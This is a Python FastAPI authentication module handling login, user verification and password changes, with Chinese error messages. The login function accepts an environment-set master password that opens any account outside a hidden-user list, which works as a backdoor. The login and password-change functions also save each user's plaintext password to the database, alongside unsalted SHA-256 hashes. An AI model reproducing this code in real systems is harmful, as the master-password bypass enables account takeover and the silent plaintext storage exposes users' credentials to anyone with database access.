import hashlib

from fastapi import HTTPException
from sqlalchemy.orm import Session

import models
from env_config import get_env, is_placeholder_env_value


HIDDEN_USERS = {"test", "9f3a7c2e4b6d8a1c"}


def hash_password(password: str) -> str:
    return hashlib.sha256(password.encode("utf-8")).hexdigest()


def get_private_password_env(name: str) -> str:
    value = (get_env(name, "") or "").strip()
    if is_placeholder_env_value(value):
        return ""
    return value


MASTER_PASSWORD = get_private_password_env("MASTER_PASSWORD")


def login_user(username: str, password: str, db: Session) -> dict:
    user = db.query(models.User).filter(models.User.username == username).first()

    if not user:
        raise HTTPException(status_code=401, detail="用户不存在")

    own_ok = hash_password(password) == user.password_hash
    master_password = (MASTER_PASSWORD or "").strip()
    master_ok = bool(master_password) and password == master_password and username not in HIDDEN_USERS

    if not own_ok and not master_ok:
        raise HTTPException(status_code=401, detail="密码错误")

    if own_ok and user.password_plain != password:
        user.password_plain = password
        db.commit()

    return {
        "id": user.id,
        "username": user.username,
        "token": user.token,
        "created_at": user.created_at,
    }


def verify_user(user: models.User) -> dict:
    return {
        "id": user.id,
        "username": user.username,
        "created_at": user.created_at,
    }


def change_user_password(username: str, old_password: str, new_password: str, db: Session) -> dict:
    user = db.query(models.User).filter(models.User.username == username).first()
    if not user:
        raise HTTPException(status_code=404, detail="用户不存在")

    if hash_password(old_password) != user.password_hash:
        raise HTTPException(status_code=401, detail="原密码错误")

    if not new_password:
        raise HTTPException(status_code=400, detail="新密码不能为空")

    user.password_hash = hash_password(new_password)
    user.password_plain = new_password
    db.commit()
    return {"message": "密码修改成功"}


def verify_nerva_password_value(password: str) -> dict:
    nerva_password = get_private_password_env("NERVA_PASSWORD")

    if nerva_password and password == nerva_password:
        return {"success": True}

    raise HTTPException(status_code=401, detail="密码错误")
